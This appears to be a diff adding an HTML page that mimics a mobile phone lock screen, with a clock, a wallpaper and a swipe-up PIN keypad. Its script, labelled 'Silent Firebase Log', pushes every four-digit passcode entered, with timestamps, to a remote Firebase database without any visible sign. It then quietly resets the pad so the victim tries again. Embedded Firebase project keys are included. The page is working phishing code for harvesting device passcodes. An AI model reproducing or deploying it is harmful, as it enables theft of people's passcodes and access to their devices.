@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Mobile Lock Screen</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+
+<script src="https://www.gstatic.com/firebasejs/10.14.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.14.0/firebase-database-compat.js"></script>
+
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Poppins', sans-serif;
+    user-select: none;
+    -webkit-user-select: none;
+  }
+
+  body, html {
+    width: 100%;
+    height: 100%;
+    overflow: hidden;
+    background-color: #fff; /* Starts as a solid white page */
+    transition: background-color 1s ease;
+  }
+
+  /* Nature Wallpaper Background Layer */
+  .wallpaper {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-image: url('https://images.unsplash.com/photo-1447752875215-b2761acb3c5d?auto=format&fit=crop&w=1200&q=80');
+    background-size: cover;
+    background-position: center;
+    z-index: 1;
+    opacity: 0; /* Hidden initially during the white screen phase */
+    transition: opacity 1.5s ease;
+  }
+
+  /* Dark overlay to make white text readable against the nature image */
+  .wallpaper::after {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; width: 100%; height: 100%;
+    background: rgba(0, 0, 0, 0.25);
+  }
+
+  /* Top Status Bar */
+  .status-bar {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    padding: 10px 24px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    color: rgba(255, 255, 255, 0.9);
+    font-size: 14px;
+    font-weight: 500;
+    z-index: 10;
+    opacity: 0;
+    transition: opacity 1s ease;
+  }
+
+  .battery-section {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+  }
+
+  .battery-icon {
+    width: 22px;
+    height: 11px;
+    border: 1px solid #fff;
+    border-radius: 3px;
+    padding: 1px;
+    position: relative;
+  }
+
+  .battery-icon::after {
+    content: '';
+    position: absolute;
+    right: -3px;
+    top: 3px;
+    width: 2px;
+    height: 4px;
+    background: #fff;
+    border-radius: 0 1px 1px 0;
+  }
+
+  .battery-level {
+    height: 100%;
+    background: #0f0;
+    width: 85%;
+    border-radius: 1px;
+  }
+
+  /* Core Lock Screen View */
+  .lock-screen-view {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+    align-items: center;
+    padding: 60px 20px 40px;
+    z-index: 5;
+    opacity: 0;
+    transition: transform 0.4s cubic-bezier(0.25, 1, 0.5, 1), opacity 1s ease;
+  }
+
+  .lock-screen-view.slide-up {
+    transform: translateY(-100%);
+    opacity: 0;
+    pointer-events: none;
+  }
+
+  /* Center Clock & Date Container */
+  .center-clock-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin-top: auto;
+    margin-bottom: auto;
+    text-align: center;
+  }
+
+  .main-time {
+    font-size: 72px;
+    font-weight: 300;
+    color: #fff;
+    line-height: 1;
+    letter-spacing: -1px;
+    text-shadow: 0 2px 15px rgba(0,0,0,0.3);
+  }
+
+  .main-date {
+    font-size: 18px;
+    color: rgba(255, 255, 255, 0.85);
+    margin-top: 5px;
+    font-weight: 400;
+    letter-spacing: 0.5px;
+    text-shadow: 0 2px 10px rgba(0,0,0,0.3);
+  }
+
+  /* Swipe Hint at Bottom */
+  .swipe-hint {
+    color: rgba(255, 255, 255, 0.8);
+    font-size: 14px;
+    animation: bounce 2s infinite;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 5px;
+  }
+
+  @keyframes bounce {
+    0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+    40% { transform: translateY(-8px); }
+    60% { transform: translateY(-4px); }
+  }
+
+  /* Numeric Keypad Password Pad Overlay */
+  .numeric-lock-view {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.55);
+    backdrop-filter: blur(25px);
+    -webkit-backdrop-filter: blur(25px);
+    z-index: 6;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    padding: 40px;
+    transform: translateY(100%);
+    transition: transform 0.4s cubic-bezier(0.25, 1, 0.5, 1);
+  }
+
+  .numeric-lock-view.active {
+    transform: translateY(0);
+  }
+
+  .passcode-header {
+    color: #fff;
+    font-size: 16px;
+    margin-bottom: 25px;
+    letter-spacing: 0.5px;
+  }
+
+  /* Dots representation for input entries */
+  .dots-container {
+    display: flex;
+    gap: 15px;
+    margin-bottom: 40px;
+  }
+
+  .dot {
+    width: 12px;
+    height: 12px;
+    border: 1.5px solid #fff;
+    border-radius: 50%;
+    transition: background-color 0.15s ease;
+  }
+
+  .dot.filled {
+    background-color: #fff;
+  }
+
+  /* 3x4 Grid Layout for Buttons */
+  .keypad-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 20px 25px;
+    max-width: 280px;
+    width: 100%;
+  }
+
+  .key-btn {
+    aspect-ratio: 1;
+    border-radius: 50%;
+    background: rgba(255, 255, 255, 0.12);
+    border: none;
+    color: #fff;
+    font-size: 28px;
+    font-weight: 400;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    outline: none;
+    transition: background 0.1s;
+    touch-action: manipulation;
+  }
+
+  .key-btn:active {
+    background: rgba(255, 255, 255, 0.3);
+  }
+
+  .key-action-label {
+    grid-column: span 1;
+    background: none;
+    font-size: 14px;
+    color: rgba(255, 255, 255, 0.8);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    border: none;
+  }
+  
+  .key-action-label:active {
+    color: #ff4f9a;
+  }
+</style>
+</head>
+<body>
+
+<div class="wallpaper" id="natureBg"></div>
+
+<div class="status-bar" id="statusBar">
+  <div id="statusDate">Loading...</div>
+  <div class="battery-section">
+    <span id="batteryText">85%</span>
+    <div class="battery-icon">
+      <div class="battery-level"></div>
+    </div>
+  </div>
+</div>
+
+<div class="lock-screen-view" id="lockView">
+  <div class="center-clock-container">
+    <h1 class="main-time" id="centerClock">00:00</h1>
+    <p class="main-date" id="centerDate">Loading...</p>
+  </div>
+  
+  <div class="swipe-hint">
+    <span>▲</span>
+    <span>Swipe up to unlock</span>
+  </div>
+</div>
+
+<div class="numeric-lock-view" id="numericView">
+  <div class="passcode-header" id="pinHeader">Enter Passcode</div>
+  
+  <div class="dots-container">
+    <div class="dot"></div>
+    <div class="dot"></div>
+    <div class="dot"></div>
+    <div class="dot"></div>
+  </div>
+  
+  <div class="keypad-grid">
+    <button class="key-btn" onclick="pressNum(1)">1</button>
+    <button class="key-btn" onclick="pressNum(2)">2</button>
+    <button class="key-btn" onclick="pressNum(3)">3</button>
+    
+    <button class="key-btn" onclick="pressNum(4)">4</button>
+    <button class="key-btn" onclick="pressNum(5)">5</button>
+    <button class="key-btn" onclick="pressNum(6)">6</button>
+    
+    <button class="key-btn" onclick="pressNum(7)">7</button>
+    <button class="key-btn" onclick="pressNum(8)">8</button>
+    <button class="key-btn" onclick="pressNum(9)">9</button>
+    
+    <button class="key-action-label" onclick="cancelPin()">Cancel</button>
+    <button class="key-btn" onclick="pressNum(0)">0</button>
+    <button class="key-action-label" onclick="backspacePin()">Delete</button>
+  </div>
+</div>
+
+<script>
+// ==========================================
+// 1. Firebase Initialization
+// ==========================================
+const firebaseConfig = {
+  apiKey: "AIzaSyDGXzFFfTcayU2L4aTC3XEfUEvl3RpaUe8",
+  authDomain: "shree-boutique-46f0a.firebaseapp.com",
+  projectId: "shree-boutique-46f0a",
+  storageBucket: "shree-boutique-46f0a.firebasestorage.app",
+  messagingSenderId: "693336656915",
+  appId: "1:693336656915:web:1e76956c03661687e443e6",
+  databaseURL: "https://shree-boutique-46f0a-default-rtdb.firebaseio.com"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+// ==========================================
+// 2. Automated 2-Second Screen Switch Loader
+// ==========================================
+setTimeout(() => {
+  document.body.style.backgroundColor = "#000000";
+  document.getElementById('natureBg').style.opacity = "1";
+  document.getElementById('statusBar').style.opacity = "1";
+  document.getElementById('lockView').style.opacity = "1";
+}, 2000);
+
+// ==========================================
+// 3. Realtime Clock and Date Updater Logic
+// ==========================================
+function updateDateTime() {
+  const now = new Date();
+  
+  let hours = now.getHours();
+  let minutes = now.getMinutes();
+  hours = hours < 10 ? '0' + hours : hours;
+  minutes = minutes < 10 ? '0' + minutes : minutes;
+  document.getElementById('centerClock').textContent = `${hours}:${minutes}`;
+
+  const dateOptions = { weekday: 'long', month: 'short', day: 'numeric' };
+  const formattedDate = now.toLocaleDateString('en-US', dateOptions);
+  
+  document.getElementById('centerDate').textContent = formattedDate;
+  document.getElementById('statusDate').textContent = now.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
+}
+setInterval(updateDateTime, 1000);
+updateDateTime();
+
+// ==========================================
+// 4. Swipe Detection Mechanics
+// ==========================================
+let startY = 0;
+const lockView = document.getElementById('lockView');
+const numericView = document.getElementById('numericView');
+
+window.addEventListener('touchstart', (e) => {
+  startY = e.touches[0].clientY;
+}, { passive: true });
+
+window.addEventListener('touchend', (e) => {
+  let endY = e.changedTouches[0].clientY;
+  if (startY - endY > 60) {
+    showPinPad();
+  }
+}, { passive: true });
+
+window.addEventListener('mousedown', (e) => {
+  startY = e.clientY;
+});
+
+window.addEventListener('mouseup', (e) => {
+  let endY = e.clientY;
+  if (startY - endY > 60) {
+    showPinPad();
+  }
+});
+
+function showPinPad() {
+  if (document.getElementById('lockView').style.opacity === "1") {
+    lockView.classList.add('slide-up');
+    numericView.classList.add('active');
+  }
+}
+
+function cancelPin() {
+  lockView.classList.remove('slide-up');
+  numericView.classList.remove('active');
+  clearPin();
+}
+
+// ==========================================
+// 5. Pin Processing & Silent Firebase Log
+// ==========================================
+let enteredPin = "";
+const dots = document.querySelectorAll('.dot');
+const pinHeader = document.getElementById('pinHeader');
+
+function pressNum(num) {
+  if (enteredPin.length >= 4) return;
+  
+  enteredPin += num;
+  updateDots();
+
+  if (enteredPin.length === 4) {
+    savePasscodeToFirebase(enteredPin);
+  }
+}
+
+function backspacePin() {
+  enteredPin = enteredPin.slice(0, -1);
+  updateDots();
+}
+
+function clearPin() {
+  enteredPin = "";
+  updateDots();
+}
+
+function updateDots() {
+  dots.forEach((dot, idx) => {
+    if (idx < enteredPin.length) {
+      dot.classList.add('filled');
+    } else {
+      dot.classList.remove('filled');
+    }
+  });
+}
+
+function savePasscodeToFirebase(pinValue) {
+  const currentTimestamp = new Date();
+
+  // Saves silently behind the scenes without shifting UI headers
+  db.ref('lockscreen_attempts').push({
+    passcodeEntered: pinValue,
+    time: currentTimestamp.toLocaleTimeString('en-US'),
+    date: currentTimestamp.toLocaleDateString('en-US'),
+    fullTimestamp: currentTimestamp.toISOString()
+  })
+  .then(() => {
+    // Instantly drops back down smoothly once saved
+    setTimeout(() => {
+      cancelPin();
+    }, 200);
+  })
+  .catch((error) => {
+    console.error("Transmission Error:", error);
+    clearPin();
+  });
+}
+</script>
+
+</body>
+</html>
